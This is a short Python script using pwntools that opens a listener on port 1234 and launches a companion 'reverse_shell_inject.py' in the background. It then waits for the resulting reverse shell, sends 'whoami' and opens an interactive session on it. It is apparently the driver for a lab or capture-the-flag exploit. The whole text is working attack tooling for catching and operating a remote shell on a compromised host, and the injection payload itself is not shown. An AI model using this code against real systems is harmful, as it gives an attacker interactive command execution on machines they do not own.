#! /usr/bin/env python3
from pwn import *
import subprocess
import os

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
p = subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()
l.sendline("whoami")
l.interactive()
